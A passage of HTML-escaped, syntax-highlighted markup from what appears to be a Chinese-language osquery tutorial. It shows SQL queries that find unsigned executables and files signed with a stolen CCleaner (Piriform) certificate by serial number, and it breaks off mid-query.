&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;processes&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LEFT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;JOIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;missing&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;追踪被盗签名证书&#34;&gt;追踪被盗签名证书
&lt;/h2&gt;&lt;p&gt;假设某恶意活动使用从合法供应商（如CCleaner）窃取的证书签名。供应商已更换新证书并重新分发应用。如何排查设备中仍使用旧证书签名的文件？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例1：查找使用被盗证书签名的文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;osquery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subject_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Program Files\CCleaner&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LEFT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;JOIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;4b48b27c8224fe37b17a6a2ed7a81c9f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;示例2：查找由该供应商签名但未使用新证书的文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;osquery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subject_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Program Files\CCleaner&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LEFT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;JOIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subject_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LIKE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Piriform%&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;52b6a81474e8048920f1909e454d7fc0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;示例3：结合代码签名与文件哈希记录&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
